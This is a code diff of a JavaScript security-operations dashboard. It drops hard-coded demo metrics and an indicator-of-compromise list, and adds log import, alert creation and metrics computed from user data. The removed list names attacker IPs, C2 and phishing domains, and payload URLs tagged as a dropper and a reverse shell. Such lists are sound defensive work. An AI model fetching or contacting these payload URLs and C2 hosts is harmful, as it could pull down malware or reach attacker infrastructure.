-  topSources: [{name:'EDR',count:89},{name:'SIEM',count:72},{name:'WAF',count:45},{name:'IDS',count:38},{name:'DLP',count:22},{name:'DNS',count:18}],
-  topMitre: [{id:'T1059',name:'Command and Scripting',count:34},{id:'T1071',name:'Application Layer Protocol',count:28},{id:'T1110',name:'Brute Force',count:22},{id:'T1003',name:'OS Credential Dumping',count:18},{id:'T1021',name:'Remote Services',count:15}],
 };
 
 // ========== DETECTION RULES ==========
@@ -645,31 +638,6 @@ const MITRE_MATRIX = [
   ]},
 ];
 
-// ========== IOC DATABASE ==========
-const IOC_DATABASE = [
-  {type:'ip',value:'185.220.101.34',classification:'Malicious',source:'Tor Exit Node',firstSeen:'2026-09-21T08:01:12Z',lastSeen:'2026-09-21T08:15:45Z',tags:['tor','brute-force','ssh'],confidence:95},
-  {type:'ip',value:'45.33.32.156',classification:'Malicious',source:'Cobalt Strike C2',firstSeen:'2026-09-21T08:07:00Z',lastSeen:'2026-09-21T08:45:00Z',tags:['c2','cobalt-strike','apt'],confidence:99},
-  {type:'ip',value:'198.51.100.50',classification:'Malicious',source:'Data Exfiltration',firstSeen:'2026-09-21T08:16:00Z',lastSeen:'2026-09-21T08:41:00Z',tags:['exfil','aws-compromise'],confidence:92},
-  {type:'ip',value:'203.0.113.42',classification:'Suspicious',source:'Web Scanner',firstSeen:'2026-09-21T08:45:05Z',lastSeen:'2026-09-21T08:46:30Z',tags:['scanner','nikto','sqlmap'],confidence:85},
-  {type:'ip',value:'198.51.100.23',classification:'Malicious',source:'Honeypot',firstSeen:'2026-09-21T08:14:00Z',lastSeen:'2026-09-21T08:14:00Z',tags:['brute-force','ssh'],confidence:88},
-  {type:'ip',value:'92.63.197.48',classification:'Suspicious',source:'Brute Force',firstSeen:'2026-09-21T08:14:30Z',lastSeen:'2026-09-21T08:15:45Z',tags:['brute-force','rdp','ssh'],confidence:82},
-  {type:'ip',value:'198.51.100.99',classification:'Suspicious',source:'Okta Logs',firstSeen:'2026-09-21T08:18:30Z',lastSeen:'2026-09-21T08:19:00Z',tags:['impossible-travel','credential-stuffing'],confidence:78},
-  {type:'ip',value:'198.51.100.77',classification:'Suspicious',source:'Web Logs',firstSeen:'2026-09-21T08:16:00Z',lastSeen:'2026-09-21T08:16:30Z',tags:['wordpress-scan','xmlrpc'],confidence:72},
-  {type:'domain',value:'evil-c2.xyz',classification:'Malicious',source:'DNS Logs',firstSeen:'2026-09-21T08:05:30Z',lastSeen:'2026-09-21T08:17:30Z',tags:['c2','dga','dns-tunnel'],confidence:97},
-  {type:'domain',value:'login-microsoft365.evil.com',classification:'Malicious',source:'Proxy Logs',firstSeen:'2026-09-21T08:28:30Z',lastSeen:'2026-09-21T08:28:30Z',tags:['phishing','credential-harvest'],confidence:95},
-  {type:'domain',value:'malware-download.xyz',classification:'Malicious',source:'IDS',firstSeen:'2026-09-21T08:24:00Z',lastSeen:'2026-09-21T08:24:00Z',tags:['malware-delivery','payload'],confidence:93},
-  {type:'domain',value:'company-lookalike.com',classification:'Malicious',source:'Email Gateway',firstSeen:'2026-09-21T08:27:00Z',lastSeen:'2026-09-21T08:27:00Z',tags:['bec','phishing','lookalike'],confidence:90},
-  {type:'domain',value:'registry.evil.com',classification:'Malicious',source:'K8s',firstSeen:'2026-09-21T08:09:00Z',lastSeen:'2026-09-21T08:09:00Z',tags:['supply-chain','container'],confidence:85},
-  {type:'domain',value:'suspicious-repo.xyz',classification:'Suspicious',source:'APT Mirror',firstSeen:'2026-09-21T08:23:30Z',lastSeen:'2026-09-21T08:23:30Z',tags:['supply-chain','tampered-package'],confidence:75},
-  {type:'hash',value:'a1b2c3d4e5f6...(SHA256)',classification:'Malicious',source:'EDR',firstSeen:'2026-09-21T08:21:00Z',lastSeen:'2026-09-21T08:21:00Z',tags:['cobalt-strike','beacon','powershell'],confidence:98},
-  {type:'hash',value:'d4e5f6a7b8c9...(SHA256)',classification:'Malicious',source:'SentinelOne',firstSeen:'2026-09-21T08:25:00Z',lastSeen:'2026-09-21T08:25:00Z',tags:['cobalt-strike','beacon','dll'],confidence:99},
-  {type:'hash',value:'abc123def456(MD5)',classification:'Malicious',source:'Carbon Black',firstSeen:'2026-09-21T08:29:30Z',lastSeen:'2026-09-21T08:29:30Z',tags:['mimikatz','credential-dump'],confidence:99},
-  {type:'email',value:'ceo@company-lookalike.com',classification:'Malicious',source:'Proofpoint',firstSeen:'2026-09-21T08:27:00Z',lastSeen:'2026-09-21T08:27:00Z',tags:['bec','impersonation'],confidence:92},
-  {type:'email',value:'attacker@evil-domain.com',classification:'Malicious',source:'O365 Audit',firstSeen:'2026-09-21T08:25:30Z',lastSeen:'2026-09-21T08:25:30Z',tags:['exfil','email-forward'],confidence:90},
-  {type:'url',value:'http://198.51.100.50/payload.sh',classification:'Malicious',source:'Audit Logs',firstSeen:'2026-09-21T08:26:00Z',lastSeen:'2026-09-21T08:26:00Z',tags:['payload','dropper'],confidence:95},
-  {type:'url',value:'http://10.0.2.100:8080/shell.ps1',classification:'Malicious',source:'Process Logs',firstSeen:'2026-09-21T08:32:00Z',lastSeen:'2026-09-21T08:32:00Z',tags:['powershell','reverse-shell'],confidence:97},
-];
-
 // ========== PLAYBOOKS ==========
 const PLAYBOOKS = [
   {id:'PB-001',name:'SSH Brute Force Response',severity:'High',mitre:'T1110',steps:[
@@ -740,20 +708,6 @@ const PLAYBOOKS = [
     {order:5,action:'Communicate status',detail:'Update internal teams and affected customers on status',automated:false},
     {order:6,action:'Post-attack analysis',detail:'Analyze attack patterns, update DDoS runbook',automated:false},
   ]},
-];
-
-// ========== LOG INGESTION PIPELINE ==========
-const INGESTION_PIPELINE = [
-  {source:'Windows Event Logs',format:'EVTX/XML',eps:1250,status:'healthy',latency:'1.2s',retention:'90 days',collectors:['WinLogBeat','NXLog']},
-  {source:'Syslog (Linux/Network)',format:'RFC5424',eps:3400,status:'healthy',latency:'0.8s',retention:'90 days',collectors:['rsyslog','syslog-ng']},
-  {source:'Firewall Logs',format:'Syslog/CEF',eps:5200,status:'healthy',latency:'1.0s',retention:'180 days',collectors:['PAN-OS Syslog','Fortinet FortiAnalyzer']},
-  {source:'EDR Telemetry',format:'JSON',eps:8900,status:'healthy',latency:'2.1s',retention:'365 days',collectors:['CrowdStrike Falcon','SentinelOne']},
-  {source:'Cloud Audit Logs',format:'JSON',eps:420,status:'healthy',latency:'3.5s',retention:'365 days',collectors:['CloudTrail','Azure Monitor','GCP Audit']},
-  {source:'DNS Query Logs',format:'Passive DNS',eps:12000,status:'warning',latency:'0.5s',retention:'30 days',collectors:['Passive DNS Tap','DNS Firewall']},
-  {source:'Proxy/WAF Logs',format:'CEF/W3C',eps:2800,status:'healthy',latency:'1.5s',retention:'90 days',collectors:['Squid','ModSecurity','Zscaler']},
-  {source:'Email Gateway',format:'JSON/CEF',eps:180,status:'healthy',latency:'4.0s',retention:'180 days',collectors:['Proofpoint TAP','Exchange Online']},
-  {source:'Identity Provider',format:'JSON',eps:320,status:'healthy',latency:'2.8s',retention:'180 days',collectors:['Okta Syslog','Azure AD']},
-  {source:'Container Runtime',format:'JSON',eps:1500,status:'degraded',latency:'5.2s',retention:'30 days',collectors:['Falco','Docker daemon']},
 ];
 
 // ========== INVESTIGATION CHECKLIST ==========
@@ -873,6 +827,7 @@ const CT_TECHNIQUES = {
   'T1486':{name:'Data Encrypted for Impact',tactic:'Impact'}
 };
 function ctTechInfo(id) {
+  if (!id) return {name:'Unmapped Technique',tactic:'Unmapped'};
   if (CT_TECHNIQUES[id]) return CT_TECHNIQUES[id];
   // Fall back to the parent technique (e.g. T1071.099 -> T1071) so unknown sub-techniques still map.
   var base = String(id || '').split('.')[0];
@@ -1013,20 +968,21 @@ function ctBuildIncidents(alerts, windowMs) {
 }
 
 // ========== SECURITY GRAPH EXPORT ==========
-// CITADEL's alert queue is built-in demo data (no SIEM connection), so every entity is tagged simulated.
+// Alerts come from the user's own imports; only alerts loaded from the example dataset are tagged simulated.
 var CT_GRAPH_SEV = {Critical:'critical',High:'high',Medium:'medium',Low:'low',Info:'info'};
 var CT_GRAPH_STATUS = {New:'new',Investigating:'investigating',Escalated:'open',Resolved:'resolved'};
 
 // Classify an alert endpoint value: IPv4 -> IP, dotted hostname -> DOMAIN, other names (DC-01, FS-01) -> ASSET.
 function ctHostItem(v, tags) {
   var type = /^\d{1,3}(\.\d{1,3}){3}$/.test(v) ? 'IP' : /^[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}$/i.test(v) ? 'DOMAIN' : 'ASSET';
-  return {type:type,name:v,data:{simulated:true,source:'CITADEL alert queue'},opts:{tags:tags}};
+  return {type:type,name:v,data:{simulated:tags.indexOf('simulated') !== -1,source:'CITADEL alert queue'},opts:{tags:tags}};
 }
 
 function ctSendAlertsToGraph(btn, alerts) {
   btn.disabled = true;
   import('/js/graph-bridge.js?v=20260923c').then(function(gb) {
-    var tags = ['citadel','soc','simulated'];
+    var sim = alerts.some(function(a){ return a.example; });
+    var tags = sim ? ['citadel','soc','simulated'] : ['citadel','soc'];
     var created = 0, updated = 0, links = 0, incidents = 0;
     var one = function(item) {
       var r = gb.sendToGraph('CITADEL', [item], undefined, true);
@@ -1037,7 +993,7 @@ function ctSendAlertsToGraph(btn, alerts) {
     alerts.forEach(function(a) {
       var alert = one({
         type:'ALERT', name:a.id + ': ' + a.title,
-        data:{alertId:a.id,rule:a.rule,source:a.source,timestamp:a.timestamp,srcIp:a.srcIp||'',dstIp:a.dstIp||'',eventCount:a.count,mitre:a.mitre,analyst:a.analyst||'',triageStatus:a.status,simulated:true},
+        data:{alertId:a.id,rule:a.rule,source:a.source,timestamp:a.timestamp,srcIp:a.srcIp||'',dstIp:a.dstIp||'',eventCount:a.count,mitre:a.mitre,analyst:a.analyst||'',triageStatus:a.status,simulated:!!a.example},
         opts:{tags:tags.concat('alert', String(a.source).toLowerCase()), severity:CT_GRAPH_SEV[a.severity]||null, status:CT_GRAPH_STATUS[a.status]}
       });
       if (!alert) return;
@@ -1047,14 +1003,14 @@ function ctSendAlertsToGraph(btn, alerts) {
       if (a.status === 'Escalated') {
         var inc = one({
           type:'INCIDENT', name:'Escalated ' + a.id + ': ' + a.title,
-          data:{fromAlert:a.id,lead:a.analyst||'',mitre:a.mitre,simulated:true},
+          data:{fromAlert:a.id,lead:a.analyst||'',mitre:a.mitre,simulated:!!a.example},
           opts:{tags:tags.concat('incident'), severity:CT_GRAPH_SEV[a.severity]||null, status:'open'}
         });
         if (inc) { incidents++; link(inc, alert, 'contains'); }
       }
     });
     btn.textContent = 'Sent: ' + created + ' new, ' + updated + ' merged';
-    gb.showGraphToast('Security Graph: ' + alerts.length + ' alerts' + (incidents ? ', ' + incidents + ' incidents' : '') + ', ' + links + ' links (tagged simulated)');
+    gb.showGraphToast('Security Graph: ' + alerts.length + ' alerts' + (incidents ? ', ' + incidents + ' incidents' : '') + ', ' + links + ' links' + (sim ? ' (tagged simulated)' : ''));
   }).catch(function() { btn.textContent = 'Security Graph unavailable'; btn.disabled = false; });
 }
 
@@ -1116,16 +1072,182 @@ export function renderCitadel(main) {
   };
 
   function getAllLogs() {
-    var all = [];
+    var all = USER_LOGS.slice();
+    if (CT_DATA.exampleLoaded) {
     SYSLOG_ENTRIES.forEach(function(e){all.push({ts:e.ts,format:'syslog',severity:e.severity,source:e.host,raw:e.msg,data:e});});
     JSON_LOGS.forEach(function(e){all.push({ts:e.ts,format:'json',severity:'info',source:e.source,raw:JSON.stringify(e.data,null,2),data:e});});
     CEF_LOGS.forEach(function(e){all.push({ts:e.ts,format:'cef',severity:'alert',source:'CEF',raw:e.raw,data:e});});
     WINDOWS_EVENTS.forEach(function(e){all.push({ts:e.ts,format:'windows',severity:e.level==='Warning'?'warning':e.level==='Error'?'error':'info',source:e.computer,raw:'EventID:'+e.eventId+' '+e.msg,data:e});});
     LEEF_LOGS.forEach(function(e){all.push({ts:e.ts,format:'leef',severity:'alert',source:'QRadar',raw:e.raw,data:e});});
     ACCESS_LOGS.forEach(function(e){all.push({ts:e.ts,format:'access',severity:'info',source:'nginx',raw:e.raw,data:e});});
+    }
     all.sort(function(a,b){return a.ts<b.ts?-1:a.ts>b.ts?1:0;});
     return all;
   }
+
+  function ctToast(msg, kind) {
+    try { if (typeof window.showToast === 'function') window.showToast(msg, kind || 'info'); } catch (_) {}
+  }
+
+  // Switch to another tab (used by empty-state actions).
+  function goTab(id) {
+    activeTab = id;
+    var bar = main.querySelector('#ct-tabbar');
+    if (bar) bar.querySelectorAll('.ct-tab').forEach(function(b){ b.classList.toggle('on', b.dataset.t === id); });
+    renderActive();
+  }
+
+  // Shared empty-state block: one sentence + a primary action.
+  function ctEmptyState(msg, actionLabel, actionTab) {
+    return '<div class="ct-panel" style="margin-bottom:12px"><div class="ct-panel-b ct-empty">' +
+      '<div style="margin-bottom:10px">' + esc(msg) + '</div>' +
+      (actionLabel ? '<button class="ct-btn" data-ct-goto="' + esc(actionTab) + '">' + esc(actionLabel) + '</button>' : '') +
+    '</div></div>';
+  }
+  function wireEmptyActions(c) {
+    c.querySelectorAll('[data-ct-goto]').forEach(function(b) {
+      b.onclick = function() { goTab(b.dataset.ctGoto); };
+    });
+  }
+
+  // Parse pasted/uploaded log text into log records (one event per line).
+  // A JSON array of alert objects (with title + severity) imports as alerts.
+  function ctIngestText(text) {
+    var res = {logs:0, alerts:0};
+    var trimmed = String(text || '').trim();
+    if (!trimmed) return res;
+    if (trimmed.charAt(0) === '[') {
+      try {
+        var arr = JSON.parse(trimmed);
+        if (Array.isArray(arr) && arr.length && arr.every(function(o){ return o && typeof o === 'object' && o.title && o.severity; })) {
+          arr.forEach(function(o) { ctAddAlert(o); res.alerts++; });
+          return res;
+        }
+        if (Array.isArray(arr)) {
+          arr.forEach(function(o) { USER_LOGS.push(ctLogFromLine(JSON.stringify(o))); res.logs++; });
+          return res;
+        }
+      } catch (_) { /* not JSON: fall through to line parsing */ }
+    }
+    trimmed.split(/\r?\n/).forEach(function(line) {
+      if (!line.trim()) return;
+      USER_LOGS.push(ctLogFromLine(line.trim()));
+      res.logs++;
+    });
+    return res;
+  }
+  function ctLogFromLine(line) {
+    var fmt = 'syslog', data = {raw:line}, source = 'import', obj = null;
+    if (/^CEF:/i.test(line)) fmt = 'cef';
+    else if (/^LEEF:/i.test(line)) fmt = 'leef';
+    else if (line.charAt(0) === '{') { try { obj = JSON.parse(line); fmt = 'json'; } catch (_) {} }
+    else if (/^\S+ \S+ \S+ \[[^\]]+\] "[A-Z]+ /.test(line)) fmt = 'access';
+    var ts = null;
+    if (obj) {
+      ts = obj.ts || obj.timestamp || obj['@timestamp'] || obj.time || obj.eventTime || null;
+      source = obj.source || obj.host || obj.hostname || obj.eventSource || 'json';
+      data = {source:source, data:obj};
+    }
+    if (!ts) { var iso = line.match(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?/); if (iso) ts = iso[0]; }
+    if (!ts) { var sys = line.match(/^([A-Z][a-z]{2}\s+\d{1,2}\s\d{2}:\d{2}:\d{2})\s+(\S+)/); if (sys) { ts = sys[1] + ' ' + new Date().getFullYear(); source = sys[2]; } }
+    if (!ts) { var acc = line.match(/\[(\d{2}\/\w{3}\/\d{4}):(\d{2}:\d{2}:\d{2}) ([+-]\d{4})\]/); if (acc) ts = acc[1].replace(/\//g, ' ') + ' ' + acc[2] + ' ' + acc[3]; }
+    var d = ts ? new Date(ts) : null;
+    var tsIso = d && !isNaN(d) ? d.toISOString() : new Date().toISOString();
+    if (fmt === 'cef') { var cp = line.split('|'); source = cp[2] || 'CEF'; }
+    else if (fmt === 'leef') { var lp = line.split('|'); source = lp[2] || 'LEEF'; }
+    else if (fmt === 'access') source = 'web';
+    var sev = fmt === 'cef' || fmt === 'leef' ? 'alert'
+      : /\b(crit(ical)?|alert|emerg)/i.test(line) ? 'alert'
+      : /\b(err(or)?|fail(ed|ure)?)\b/i.test(line) ? 'error'
+      : /\b(warn(ing)?|block(ed)?|denied|deny|drop)\b/i.test(line) ? 'warning' : 'info';
+    return {ts:tsIso, format:fmt, severity:sev, source:String(source), raw:fmt === 'json' ? JSON.stringify(obj, null, 2) : line, data:data};
+  }
+  // Normalize and append one alert to the user's queue.
+  function ctAddAlert(o) {
+    var sevs = {critical:'Critical',high:'High',medium:'Medium',low:'Low'};
+    var stats = {new:'New',investigating:'Investigating',escalated:'Escalated',resolved:'Resolved'};
+    var a = {
+      id: o.id ? String(o.id) : 'ALT-' + String(CT_DATA.nextAlert++).padStart(3, '0'),
+      title: String(o.title || 'Untitled alert'),
+      severity: sevs[String(o.severity || '').toLowerCase()] || 'Low',
+      status: stats[String(o.status || '').toLowerCase()] || 'New',
+      source: String(o.source || 'Manual'),
+      timestamp: o.timestamp && !isNaN(new Date(o.timestamp)) ? new Date(o.timestamp).toISOString() : new Date().toISOString(),
+      srcIp: o.srcIp || null, dstIp: o.dstIp || null,
+      rule: String(o.rule || 'MANUAL'), count: Number(o.count) || 1,
+      mitre: o.mitre || null, analyst: o.analyst || null,
+      createdAt: Date.now(), example: !!o.example
+    };
+    ALERTS.push(a);
+    return a;
+  }
+  // Create an alert from a log record (Log Explorer "Create Alert").
+  function ctAlertFromLog(log) {
+    var ips = ctExtractIps(log.raw);
+    var tech = log.raw.match(/\bT\d{4}(?:\.\d{3})?\b/);
+    var title = log.format === 'cef' || log.format === 'leef' ? (log.raw.split('|')[5] || log.raw) : log.raw.replace(/\s+/g, ' ');
+    return ctAddAlert({
+      title: title.substring(0, 100),
+      severity: log.severity === 'alert' ? 'High' : log.severity === 'error' || log.severity === 'warning' ? 'Medium' : 'Low',
+      source: log.source, timestamp: log.ts, srcIp: ips[0] || null, dstIp: ips[1] || null,
+      rule: 'LOG_EVENT', mitre: tech ? tech[0] : null
+    });
+  }
+  function ctLoadExample() {
+    CT_DATA.exampleLoaded = true;
+    if (!ALERTS.some(function(a){ return a.example; })) {
+      EXAMPLE_ALERTS.forEach(function(x) { var a = Object.assign({}, x, {id:'EX-' + x.id.replace('ALT-',''), example:true, createdAt:Date.now()}); ALERTS.push(a); });
+    }
+  }
+  function ctClearData() {
+    ALERTS.length = 0; USER_LOGS.length = 0;
+    CT_DATA.exampleLoaded = false; CT_DATA.nextAlert = 1;
+    selectedAlert = null; selectedIncident = 0; matrixSelectedTech = null;
+  }
+
+  // SOC metrics computed from the user's alert queue. Values that cannot be
+  // derived are null and render as an em dash.
+  function ctComputeMetrics() {
+    var m = {total:ALERTS.length, open:0, closed:0, criticalOpen:0, escalated:0, fp:0, mttr:null, mttd:null, fpRate:null, escalationRate:null,
+      sources:{}, analysts:{}, techs:{}, tactics:{}, assets:{}, days:[]};
+    var resTimes = [], triaged = 0;
+    ALERTS.forEach(function(a) {
+      if (a.status === 'Resolved') { m.closed++; if (a.closedAt) { triaged++; if (a.fp) m.fp++; if (a.createdAt) resTimes.push(a.closedAt - a.createdAt); } }
+      else { m.open++; if (a.severity === 'Critical') m.criticalOpen++; }
+      if (a.status === 'Escalated' || a.escalated) m.escalated++;
+      m.sources[a.source] = (m.sources[a.source] || 0) + 1;
+      if (a.analyst) {
+        var an = m.analysts[a.analyst] || (m.analysts[a.analyst] = {name:a.analyst, open:0, closed:0, times:[]});
+        if (a.status === 'Resolved') { an.closed++; if (a.closedAt && a.createdAt) an.times.push(a.closedAt - a.createdAt); } else an.open++;
+      }
+      if (a.mitre) {
+        m.techs[a.mitre] = (m.techs[a.mitre] || 0) + 1;
+        var tac = ctTechInfo(a.mitre).tactic;
+        m.tactics[tac] = (m.tactics[tac] || 0) + 1;
+      }
+      [a.srcIp, a.dstIp].filter(Boolean).forEach(function(h) {
+        var r = m.assets[h] || (m.assets[h] = {asset:h, alerts:0, crit:0});
+        r.alerts++; if (a.severity === 'Critical') r.crit++;
+      });
+    });
+    if (resTimes.length) m.mttr = Math.round(resTimes.reduce(function(s,v){return s+v;},0) / resTimes.length / 60000);
+    // FP rate only over alerts closed in Alert Triage (where Close as FP vs Resolve is recorded).
+    if (triaged) m.fpRate = Math.round(m.fp / triaged * 100);
+    if (m.total) m.escalationRate = Math.round(m.escalated / m.total * 100);
+    // Alert volume for the 7 most recent calendar days present in the data.
+    var byDay = {};
+    ALERTS.forEach(function(a){ var d = String(a.timestamp).slice(0,10); byDay[d] = (byDay[d] || 0) + 1; });
+    var latest = Object.keys(byDay).sort().pop();
+    if (latest) {
+      var end = new Date(latest + 'T00:00:00Z');
+      for (var i = 6; i >= 0; i--) {
+        var dd = new Date(end.getTime() - i * 86400000).toISOString().slice(0,10);
+        m.days.push({day:dd.slice(5), count:byDay[dd] || 0});
+      }
+    }
+    return m;
+  }
+  function ctFmt(v, unit) { return v === null || v === undefined ? '&mdash;' : v + (unit ? '<span style="font-size:.6rem">' + unit + '</span>' : ''); }
 
   function renderShell() {
     ctClearCitadelTimers();
@@ -1353,14 +1475,17 @@ export function renderCitadel(main) {
   }
 
   // ========== SOC DASHBOARD ==========
+  // Every number here is derived from the user's own alert queue / ingested
+  // logs. With no data the KPIs read 0 or an em dash and panels show empty states.
   function renderDashboard(c) {
+    var m = ctComputeMetrics();
     var crit = ALERTS.filter(function(a){return a.severity==='Critical'});
     var high = ALERTS.filter(function(a){return a.severity==='High'});
     var med = ALERTS.filter(function(a){return a.severity==='Medium'});
     var open = ALERTS.filter(function(a){return a.status!=='Resolved'});
-    var investigating = ALERTS.filter(function(a){return a.status==='Investigating'});
-    var escalated = ALERTS.filter(function(a){return a.status==='Escalated'});
-    var newAlerts = ALERTS.filter(function(a){return a.status==='New'});
+    var hasAlerts = ALERTS.length > 0;
+    var logs = getAllLogs();
+    var noData = '<div class="ct-empty" style="padding:16px">No data yet</div>';
 
     var hours = [];
     for (var h = 0; h < 24; h++) {
@@ -1376,23 +1501,38 @@ export function renderCitadel(main) {
       });
       hours.push(hc);
     }
+    var srcKeys = Object.keys(m.sources).sort(function(a,b){return m.sources[b]-m.sources[a];}).slice(0,6);
+    var analysts = Object.keys(m.analysts).map(function(k){return m.analysts[k];});
+    var techKeys = Object.keys(m.techs).sort(function(a,b){return m.techs[b]-m.techs[a];}).slice(0,5);
+    var tacticKeys = CT_TACTIC_ORDER.filter(function(t){return m.tactics[t];});
+    var incidents = hasAlerts ? ctBuildIncidents(ALERTS, 60 * 60 * 1000).filter(function(x){return x.members.some(function(a){return a.status!=='Resolved';});}).slice(0,6) : [];
+    var assetKeys = Object.keys(m.assets).sort(function(a,b){return m.assets[b].alerts-m.assets[a].alerts;}).slice(0,12);
+    var logSrc = {};
+    logs.forEach(function(l){ var k = l.format + '||' + l.source; logSrc[k] = (logSrc[k] || 0) + 1; });
+    var logSrcKeys = Object.keys(logSrc).sort(function(a,b){return logSrc[b]-logSrc[a];}).slice(0,10);
+    var actorHits = THREAT_ACTORS.map(function(ta) {
+      var seen = ta.ttps.filter(function(t){ return ALERTS.some(function(a){ return a.mitre && String(a.mitre).split('.')[0] === String(t).split('.')[0]; }); });
+      return {ta:ta, seen:seen};
+    }).filter(function(x){return x.seen.length;}).sort(function(a,b){return b.seen.length-a.seen.length;});
 
     c.innerHTML =
+      (hasAlerts ? '' : ctEmptyState('No alerts yet. Paste or upload logs in the Log Explorer, then create alerts from events or import an alert list.', 'Import logs', 'logs')) +
       '<div class="ct-grid4" style="margin-bottom:12px">' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + crit.length + '</div><div class="ct-stat-l">Critical</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + high.length + '</div><div class="ct-stat-l">High</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#ffd600">' + med.length + '</div><div class="ct-stat-l">Medium</div></div>' +
         '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + open.length + '</div><div class="ct-stat-l">Open Alerts</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + SOC_METRICS.mttd.current + '<span style="font-size:.6rem">m</span></div><div class="ct-stat-l">MTTD</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + SOC_METRICS.mttr.current + '<span style="font-size:.6rem">m</span></div><div class="ct-stat-l">MTTR</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v">' + SOC_METRICS.falsePositiveRate.current + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">False Positive Rate</div></div>' +
-        '<div class="ct-stat"><div class="ct-stat-v">' + ALERTS.length + '</div><div class="ct-stat-l">Total Alerts (24h)</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + ctFmt(m.mttd, 'm') + '</div><div class="ct-stat-l">MTTD</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e5ff">' + ctFmt(m.mttr, 'm') + '</div><div class="ct-stat-l">MTTR</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ctFmt(m.fpRate, '%') + '</div><div class="ct-stat-l">False Positive Rate</div></div>' +
+        '<div class="ct-stat"><div class="ct-stat-v">' + ALERTS.length + '</div><div class="ct-stat-l">Total Alerts</div></div>' +
       '</div>' +
 
       '<div class="ct-grid2" style="margin-bottom:12px">' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Severity Heatmap (24h)</div>' +
+          '<div class="ct-panel-h">Severity Heatmap (by hour, UTC)</div>' +
           '<div class="ct-panel-b">' +
+            (hasAlerts ?
             '<div style="display:flex;gap:4px;margin-bottom:6px;font-size:.55rem;color:var(--mut)">' +
               Array.from({length:24},function(_,i){return '<div style="flex:1;text-align:center">'+(i<10?'0':'')+i+'</div>';}).join('') +
             '</div>' +
@@ -1408,30 +1548,31 @@ export function renderCitadel(main) {
               '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,145,0,.5);border-radius:2px;vertical-align:middle"></span> High</span>' +
               '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(255,214,0,.3);border-radius:2px;vertical-align:middle"></span> Medium</span>' +
               '<span><span style="display:inline-block;width:10px;height:10px;background:rgba(0,230,118,.2);border-radius:2px;vertical-align:middle"></span> Low</span>' +
-            '</div>' +
+            '</div>'
+            : noData) +
           '</div>' +
         '</div>' +
 
         '<div class="ct-panel">' +
           '<div class="ct-panel-h">Alert Sources</div>' +
           '<div class="ct-panel-b">' +
-            SOC_METRICS.topSources.map(function(s) {
-              var pct = Math.round((s.count / SOC_METRICS.alertVolume.today) * 100);
+            (srcKeys.length ? srcKeys.map(function(s) {
+              var pct = Math.round((m.sources[s] / ALERTS.length) * 100);
               return '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;font-size:.68rem">' +
-                '<span style="min-width:50px;color:var(--mut)">' + esc(s.name) + '</span>' +
+                '<span style="min-width:50px;color:var(--mut)">' + esc(s) + '</span>' +
                 '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + pct + '%;background:var(--acc)"></div></div>' +
-                '<span style="min-width:30px;text-align:right;font-weight:600">' + s.count + '</span>' +
+                '<span style="min-width:30px;text-align:right;font-weight:600">' + m.sources[s] + '</span>' +
               '</div>';
-            }).join('') +
+            }).join('') : noData) +
           '</div>' +
         '</div>' +
       '</div>' +
 
       '<div class="ct-grid2" style="margin-bottom:12px">' +
         '<div class="ct-panel">' +
-          '<div class="ct-panel-h">Live Alert Feed</div>' +
+          '<div class="ct-panel-h">Alert Feed (latest)</div>' +
           '<div class="ct-panel-b" style="max-height:280px;overflow-y:auto">' +
-            ALERTS.slice(0,15).map(function(a) {
+            (hasAlerts ? ALERTS.slice().sort(function(a,b){return new Date(b.timestamp)-new Date(a.timestamp);}).slice(0,15).map(function(a) {
               var sevClass = a.severity==='Critical'?'ct-crit':a.severity==='High'?'ct-high':a.severity==='Medium'?'ct-med':'ct-low';
               var statusClass = a.status==='New'?'ct-new':a.status==='Investigating'?'ct-inv':a.status==='Escalated'?'ct-esc':'ct-res';
               return '<div class="ct-feed-item">' +
@@ -1440,33 +1581,22 @@ export function renderCitadel(main) {
                 '<span style="flex:1">' + esc(a.title) + '</span>' +
                 '<span class="ct-badge ' + statusClass + '">' + esc(a.status) + '</span>' +
               '</div>';
-            }).join('') +
+            }).join('') : noData) +
           '</div>' +
         '</div>' +
 
         '<div class="ct-panel">' +
           '<div class="ct-panel-h">Analyst Board</div>' +
           '<div class="ct-panel-b">' +
-            SOC_METRICS.analystLoad.map(function(a) {
+            (analysts.length ? analysts.map(function(a) {
               return '<div class="ct-analyst" style="margin-bottom:6px">' +
-                '<div class="ct-analyst-avatar">' + esc(a.name.charAt(a.name.length-1)) + '</div>' +
+                '<div class="ct-analyst-avatar">' + esc(a.name.charAt(0).toUpperCase()) + '</div>' +
                 '<div style="flex:1">' +
                   '<div style="font-size:.72rem;font-weight:600">' + esc(a.name) + '</div>' +
-                  '<div style="font-size:.6rem;color:var(--mut)">Open: ' + a.open + ' | Closed: ' + a.closed + ' | Avg: ' + a.avgTime + 'm</div>' +
+                  '<div style="font-size:.6rem;color:var(--mut)">Open: ' + a.open + ' | Closed: ' + a.closed + '</div>' +
                 '</div>' +
-                '<div class="ct-gauge" style="width:80px"><div class="ct-gauge-fill" style="width:' + Math.min(100,Math.round(a.open/30*100)) + '%;background:' + (a.open>20?'#ff1744':a.open>15?'#ff9100':'#00e676') + '"></div></div>' +
               '</div>';
-            }).join('') +
-            '<div style="margin-top:10px">' +
-              '<div class="ct-panel-h" style="border:none;padding:4px 0">Current Shift</div>' +
-              SOC_METRICS.shifts.map(function(s) {
-                return '<div style="display:flex;justify-content:space-between;font-size:.65rem;padding:3px 0;border-bottom:1px solid var(--line)">' +
